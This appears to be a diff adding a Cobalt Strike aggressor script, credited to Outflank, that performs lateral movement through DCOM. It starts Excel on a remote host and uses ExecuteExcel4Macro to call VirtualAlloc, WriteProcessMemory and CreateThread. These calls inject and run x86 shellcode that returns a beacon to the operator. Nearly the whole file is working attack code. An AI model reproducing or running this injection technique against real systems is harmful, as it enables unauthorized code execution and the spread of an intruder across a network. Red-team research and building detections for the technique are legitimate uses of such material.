@@ -1,0 +1,89 @@
+# ExecuteExcel4Macro DCOM Lateral Movement script for Cobalt Strike
+#
+# Author: Stan Hegt (@StanHacked) / Outflank
+# Version: 1.0 (20190324)
+#
+# Code inspired by Raphael Mudge's comexec.cna
+
+# Register help for  alias
+beacon_command_register("excel4-dcom", "Lateral movement with ExecuteExcel4Macro via DCOM",
+	"Synopsis: excel4-dcom [target] [listener]\n\n" .
+	"Inject stager payload into excel.exe on a target via ExecuteExcel4Macro DCOM\n" .
+	"Make sure to run this command in 32 bit beacons only (requires 32 bit PS host)!");
+
+# Alias and argument initialisation
+alias excel4-dcom {
+	if ($3 is $null) {
+		# Let the user choose a listener
+		openPayloadHelper(lambda({
+			excel4_dcom_go($bid, $target, $1);
+		}, $bid => $1, $target => $2));
+	}
+	else {
+		# We have the needed arguments, pass them
+		excel4_dcom_go($1, $2, $3);
+	}
+}
+
+# Implementation
+sub excel4_dcom_go {
+	local('$command $script $oneliner');
+
+	# Check if listener exists
+	if (listener_info($3) is $null) {
+		berror($1, "Listener $3 does not exist");
+		return;
+	}
+	
+	# Check if beacon is x86 or x64
+	if ((beacon_info($1, "barch") cmp "x64") == 0) {
+		berror($1, "Please run this command from an x86 beacon");
+		return;
+	}
+	
+	btask($1, "Tasked Beacon to jump to $2 (" . listener_describe($3, $2) . ") via ExecuteExcel4Macro DCOM");
+
+	# Generate x86 shellcode - note that x64 is not implemented due to Excel 4.0 data types. 
+	# Fortunately most MS Office installs are still 32 bits. :-)
+	$data = shellcode($3, false, "x86");
+	$length = strlen($data);
+	
+	# Build PowerShell script that uses DCOM to invoke ExecuteExcel4Macro on Excel.Application object
+	$script = 'Function Invoke-Excel4DCOM {' . "\n";
+	$script .= "\t" . '$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "' . $2 . '"));' . "\n";
+	
+	# VirtualAlloc of strlen(shellcode) size
+	$script .= "\t" . '$memaddr = $excel.ExecuteExcel4Macro(\'CALL("Kernel32","VirtualAlloc","JJJJJ",0,' . $length . ',4096,64)\');' . "\n";
+
+	# Write shellcode per byte (yes, this should be implemented more neatly in a future release)
+	for ($i = 0; $i < $length; $i++) {
+		$script .= "\t" . '$string = "CHAR`(' . asc(charAt($data, $i)) . '`)";';
+		$script .= '$ret = $excel.ExecuteExcel4Macro(\'CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, \' + ($memaddr + ' . $i . ') + \', \' + $string + \', 1, 0)\');' . "\n";
+	}
+
+	# CreateThread call to kick off our shellcode
+	$script .= "\t" . '$excel.ExecuteExcel4Macro(\'CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, \' + $memaddr + \', 0, 0, 0)\');' . "\n";
+
+	# We keep our DCOM object alive for 1 hour
+	$script .= "\t" . 'Start-Sleep -seconds 3600' . "\n";
+
+	$script .= '}' . "\n";
+	
+	# Temporarily write the script to disk
+	$handle = openf(">".script_resource("excel4-dcom.ps1"));
+	writeb($handle, $script);
+	closef($handle);
+	
+	btask($1, "Stored lateral movement PowerShell script in " . script_resource("excel4-dcom.ps1"));
+	
+	# Run the script we built. Note that we have to do this via powershell_import, due to the scripts file size
+	bpowershell_import($1, script_resource("excel4-dcom.ps1"));
+	bpowershell!($1, "Invoke-Excel4DCOM");
+	
+	btask($1, "PowerShell initiated (you can verify this with the jobs command).");
+	
+	# Complete staging process (for bind_pipe listeners)
+	bstage($1, $2, $3);
+
+	btask($1, "Completed! If everything worked, you will have a beacon in a few minutes. Note that this beacon will auto-exit after one hour, so make sure to migrate before this.");
+}
